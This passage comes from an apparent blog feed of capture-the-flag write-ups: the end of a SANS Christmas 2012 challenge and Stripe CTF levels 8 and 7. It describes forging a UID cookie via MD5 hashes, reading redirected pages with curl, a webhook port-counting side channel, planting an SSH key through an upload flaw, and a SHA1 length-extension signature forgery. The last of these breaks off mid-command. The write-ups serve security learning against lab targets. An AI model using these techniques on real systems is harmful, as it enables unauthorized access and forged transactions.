                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Location: noaccess.php&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="nv"&gt;$accessallowed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$zone&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;../include/template.inc.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we know how the One Time Passwords are generated. We just have to
send the correct SHA1 sum, using the server's current time, which we can
find in the source code of the noaccess.php page.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-5"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3ab1c5fa327343721bc798f116be8dc6&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for the North Pole.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="heat-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://heatmiser.counterhack.com/"&gt;Heat Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;1732bcff12e6550ff9ea44d594001418&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We had a security concern where the Zone 1 URL ended up in search
engine results. We added a file to prevent the search engines from
caching these pages. The system is now secure an no unauthorized
users have access to the URL.&lt;/p&gt;
&lt;p&gt;Don't even try to access the other zones, because you won't be able
to. And if you are helping my brother, GO AWAY!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The important part here is the file to prevent indexing by search
engines. Heat Miser is talking about the robots.txt file, which tells
search engine crawlers what page they can crawl. By loading this file,
we find the wanted URL: zone-1-E919DBF1-E4FA-4141-97C4-3F38693D2161.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;d8c94233daef256c42bb95bd61382e02&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We had an issue with Zone 2 and we had to temporarily remove the
link. It is now back and in full operation. We appoligize to those
living in Zone 2 as it may have gotten a tad chilly. Everything is
fully operational now.&lt;/blockquote&gt;
&lt;p&gt;Looking at the comment will give you the URL to the next zone:
zone-2-761EBBCF-099F-4DB0-B63F-9ADC61825D49&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;ef963731de7e886226fe4a6a6c2971f1&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We are sorry, but due to the negligence of one of our fiery minions,
we had to change the link for Zone 3. If you should have access then
you should have received an email. The new zone 3 link starts with
zone-3-83FEE8BE-B1C6-4395-A56A-XXXXXXXXXXXX.&lt;/blockquote&gt;
&lt;p&gt;There are 281,474,976,710,656 possibilities for the last set of numbers,
so don't bother brute forcing it. Once again, we have an incomplete URL.
But Heat Miser tweets this message:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_1.png" /&gt;
&lt;p&gt;The tweeted image is:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal.png" /&gt;
&lt;p&gt;And, as Snow Miser says:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_2.png" /&gt;
&lt;p&gt;This is looks just like the first level of Snow Miser. Using GIMP, we
can make the end of the URL appear:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal_enhanced.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal_enhanced.png" /&gt;
&lt;p&gt;Which gives us the URL: zone-3-83FEE8BE-B1C6-4395-A56A-BF933FC85254&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;0d524fb8d8f9f88eb9da5b286661a824&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We added a new security mechanism to Zone 4 so it won't matter if
SOMEONE LEAKS IT AGAIN!&lt;/p&gt;
&lt;p&gt;Zone 4 (zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can directly access zone 4, since Heat Miser posts a link to it. But
when we click it, we're redirected to another page, noaccess.php. The
hint comes from a tweet from Snow Miser:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_3.png" /&gt;
&lt;p&gt;The tweeted image is from &lt;a class="reference external" href="http://knowyourmeme.com/memes/the-most-interesting-man-in-the-world"&gt;the most interesting man in the
world&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="snow_miser_most_interesting_man.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_most_interesting_man.jpg" /&gt;
&lt;p&gt;Heat Miser redirects us, using a &lt;code&gt;header(&amp;quot;location: new_url&amp;quot;);&lt;/code&gt;, but
forgets to use the &lt;code&gt;exit&lt;/code&gt; function. It
means that the rest of the page is executed, then sent to our browser,
with a Location header, which our browser follows. But if we use a
client which does not follow redirection, we can recover the first page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://heatmiser.counterhack.com/zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;zone-5&amp;quot;&lt;/span&gt;
Link to &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/zone-5-15614E3A-CEA7-4A28-A85A-D688CC418287/&amp;quot;&lt;/span&gt;&amp;gt;Zone 5&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;e3ae414e6d428c3b0c7cff03783e305f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Okay, we have the URL to zone 5, but when we try to access it directly,
we're redirected again to noaccess.php. To give us a clue about where to
look, Snow Miser tweets:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_4.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_4.png" /&gt;
&lt;p&gt;So, we know that we should look at the cookies. There's only one:
&lt;code&gt;UID=b8c37e33defde51cf91e1e03e51657da&lt;/code&gt;. A 32 byte hex string:
it looks like a MD5 hash. If we reverse it (using online tools, or
programs like John The Ripper), we find that it's the hash of the string
&amp;quot;1001&amp;quot;, which explains Snow Miser's tweet.&lt;/p&gt;
&lt;p&gt;A value like 1001, and a name like UID indicates that this hash
corresponds to a user ID, and an unprivileged one, since he can't access
zone 5. The first value I tried was a UID of 0 (which means a MD5 of
&lt;code&gt;cfcd208495d565ef66e7dff9f98764da&lt;/code&gt;) since it's root's UID on
Linux, but it turned out that the correct value was 1 (which means a MD5
&lt;code&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/code&gt;). We modify the cookie's
value, and we reload the page to access zone 5.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id6"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;f478c549e37fa33467241d847f862e6f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for Southtown.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I'll give it to you: this challenge wasn't really complicated. Mostly
because the first zones of both controllers where kinda easy, but also
because of all the hints in the tweets. Yet, I'm still glad I did it
because:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;I learned the SVN vulnerability&lt;/li&gt;
&lt;li&gt;I learned common mistakes, like forgetting &lt;code&gt;exit&lt;/code&gt; after a
redirect&lt;/li&gt;
&lt;li&gt;I added new tricks to my &amp;quot;to-do&amp;quot; list when looking for
vulnerability/information disclosure (like the use of steghide, or
looking at files in docs leaks)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hoped this wasn't too long, and that you learned something from it. I
wish you a merry Christmas, a happy new year, and lots of pentesting ;)&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Stripe CTF: Level #8</title><link href="https://allyourbase.utouch.fr/posts/2012/12/15/stripe-ctf-level-8/" rel="alternate"></link><updated>2012-12-15T20:06:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-15:posts/2012/12/15/stripe-ctf-level-8/</id><summary type="html">&lt;img alt="level08-logo.jpg" class="align-center" src="/images/stripe-ctf-level-8/level08-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-8/stripe-ctf-level08.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d211aa240a0a59eb1f56d3c42a55080d0e27eea2c04bc4410bf608824c847c96&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This is it. The final level to the Stripe CTF. The goal here is to
retrieve a 12-digit password, which is too long to brute force. Let's
see how we can use the protocol to our advantage.&lt;/p&gt;
&lt;p&gt;The infrastructure looks like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;a central server, used to verify the password&lt;/li&gt;
&lt;li&gt;four &amp;quot;chunk&amp;quot; servers, which each knows only a part of the password&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When you send a password to the central server, it cuts it in four
pieces, and procedes like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;it asks the first chunk server if the first piece is correct&lt;/li&gt;
&lt;li&gt;if not, it sends a failure message to the client (and doesn't contact
any other chunk server)&lt;/li&gt;
&lt;li&gt;if it is, it asks the second chunk server if the second piece is
correct&lt;/li&gt;
&lt;li&gt;etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Furthermore, we can give the server a list of webhooks, to which it'll
send the result.&lt;/p&gt;
&lt;p&gt;Seeing the password verification protocol, I know what you're thinking:
timing attack. Seeing how much time the server takes to respond, we can
find how many chunk servers it contacted, thus how many chunk we
&lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; possibilities, we're down to
&lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt; possibilities, which is feasible.&lt;/p&gt;
&lt;p&gt;The problem is that the server has a way to prevent timing attack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File primary_server, line 58&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nextServerCallback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;parsed_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c"&gt;# Chunk was wrong!&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;parsed_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="c"&gt;# Defend against timing attacks&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expectedRemainingTime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Going to wait &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; seconds before responding&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callLater&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendResult&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;

    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkNext&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If a chunk is wrong, the server waits before telling the client he made
a mistake. So we can't use a timing attack.&lt;/p&gt;
&lt;p&gt;But there is another way to know how many chunk servers the primary
contacted, and thus go from &lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; to &lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt;
the webhooks. Here is the idea:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;when the primary server communicates with an external resource
(whether it's a chunk server or a webhook), it opens a socket&lt;/li&gt;
&lt;li&gt;every time the primary server opens a socket, its client port is
incremented by one&lt;/li&gt;
&lt;li&gt;the webhook knows the client port of the primary server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, by looking at how much was the client port incremented between two
responses, the webhook knows how many chunk servers were contacted.
Indeed, let's say the first chunk is wrong: the primary server connects
to the first chunk server, then to the webhook. The port is therefore
incremented by two. If the first chunk is correct, but not the second is
wrong, the primary servers contacts the first chunk server, the second
chunk server, then the webhook. The port is incremented by three, etc.&lt;/p&gt;
&lt;p&gt;So, knowing this we can't find the correct chunks, but we can eliminate
the bad chunks, which is faster than bruteforcing the whole password,
but still takes a lot of time. What's more, the primary server can only
contact webhooks with URL ending with .stripe-ctf.com (in the production
environment). Fortunately, we still have access to the level 2 server
(remember, the one with the upload vulnerability?) We can upload an SSH
key, connect, and then launch our webhook.&lt;/p&gt;
&lt;p&gt;Unfortunately, I lost the source code of my custom webhook (sorry about
that!). It was based on a webhook coded by a friend of Lopi. Basically,
it tried every possible combination, chunk by chunk, and eliminated the
bad ones as it did so.&lt;/p&gt;
&lt;p&gt;The attack took something like two days, because I kept being
disconnected of the server, and because there were so many people on it
running their own webhook. I think it was kind of stubborn from Stripe
to force the webhook to be on one of their server.&lt;/p&gt;
&lt;img alt="level08-scumbag-stripe.png" class="align-center" src="/images/stripe-ctf-level-8/level08-scumbag-stripe.png" /&gt;
&lt;p&gt;Anyway, after some time, you find the correct password, which you submit
to the Stripe web site.&lt;/p&gt;
&lt;img alt="level08-w00t.png" class="align-center" src="/images/stripe-ctf-level-8/level08-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
&lt;p&gt;That's it for the Stripe CTF! I know I took a lot of time writing these
write ups, but I learned a lot from this competition, especially the
SHA1 padding attack, how to find where to put my Javascript so it's
executed, and how to obfuscate it. Plus I won a super cool t-shirt!&lt;/p&gt;
&lt;p&gt;See you for another CTF!&lt;/p&gt;
&lt;img alt="stripe-ctf-prize.jpg" class="align-center" src="/images/stripe-ctf-level-8/stripe-ctf-prize.jpg" /&gt;
</summary></entry><entry><title>Stripe CTF: Level #7</title><link href="https://allyourbase.utouch.fr/posts/2012/12/09/stripe-ctf-level-7/" rel="alternate"></link><updated>2012-12-09T15:07:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-09:posts/2012/12/09/stripe-ctf-level-7/</id><summary type="html">&lt;img alt="level07-logo.jpg" class="align-center" src="/images/stripe-ctf-level-7/level07-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is the most delicious of all: you can order waffles online,
and the company will have them delivered to the location you specified.
There are seven types of waffle: veritaffle, belgian, brussels, eggo,
chicken (premium), dream (premium), and the king of waffles, liege
(premium). You have an unprivileged account (login: ctf, password:
password), so you can't order premium waffles. Yet, your goal is to
order the supreme waffle: the liege. There are four other users on the
website: larry (premium account), randall (premium account), alice and
bob. Every user has an ID, and a secret (which has the form of a random
string).&lt;/p&gt;
&lt;img alt="level07-ctf-user-interface.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-user-interface.png" /&gt;
&lt;p&gt;The company provides you with a client API you can use to order waffles.
Every order is of the form:
&lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&lt;/code&gt;. Then, a
signature is computed using the client's secret, and appended to the
order. The signature is of the form:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File client.py, line 61&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;api_secret&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c"&gt;# signature = SHA1(secret + message)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can view our past orders at the URL /logs/id.&lt;/p&gt;
&lt;img alt="level07-ctf-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-order.png" /&gt;
&lt;p&gt;But what if we change the ID in the URL?&lt;/p&gt;
&lt;img alt="level07-larry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-larry-order.png" /&gt;
&lt;img alt="level07-barry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-barry-order.png" /&gt;
&lt;p&gt;Bingo, we are now viewing larry's and randall's past orders. But since
they didn't order any liege, we can't use these orders as is. Let's see
in the code how the order is checked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File wafflecopter.py, line 139&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parse_params&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;pairs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's the code which parse the body of the order. We can see that they
don't check if a parameter has been specified more than once. So if you
send an order of the form: &lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&amp;amp;waffle=YYY&lt;/code&gt;,
the last waffle will be ordered (in this case, YYY).&lt;/p&gt;
&lt;p&gt;Great, so we can just take a previous order from larry, append
&lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt; to the end, and send it to the server!
Actually, we can't, because of the signature: if we change the order,
but not the signature, they won't match, and the server will refuse to
carry our order. So we need to change the signature. But how can we do
that without knowing larry's secret? The key here is cryptography.&lt;/p&gt;
&lt;p&gt;Like we said earlier, the signature is computed via &lt;code&gt;SHA1(secret +
message)&lt;/code&gt;. But the SHA1 function follows the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"&gt;Merkle–Damgård
construction&lt;/a&gt;.
Basically, the message is broken up in equal blocks of 512 bits. Then,
computation is done on the first block and produces an output. This
output is used to perform the same computation on the second block, and
so on. So, it means that given &lt;code&gt;SHA1(secret + message)&lt;/code&gt; and the
and the length of &lt;code&gt;secret&lt;/code&gt;, we can compute &lt;code&gt;SHA1(secret + message +
message_modifier)&lt;/code&gt;. And that's exactly what we want, to append
something (here, &lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt;) at the end of the message.&lt;/p&gt;
&lt;p&gt;I started searching for a Python implementation of SHA1, and wanted to
modify it so that it would compute my forged signature, but it took too
much time. Fortunately, two guys I was working with on the CTF,
&lt;a class="reference external" href="https://twitter.com/_Lopi_"&gt;lopi&lt;/a&gt; and mark, found a script that
could forge the signature for us. The script was taken down since then,
but you can find another working one &lt;a class="reference external" href="https://gist.github.com/philfreo/3873715"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python sha-padding.py
usage: sha-padding.py &amp;lt;keylen&amp;gt; &amp;lt;original_message&amp;gt; &amp;lt;original_signature&amp;gt;
&amp;lt;text_to_append&amp;gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;python sha-padding.py 14
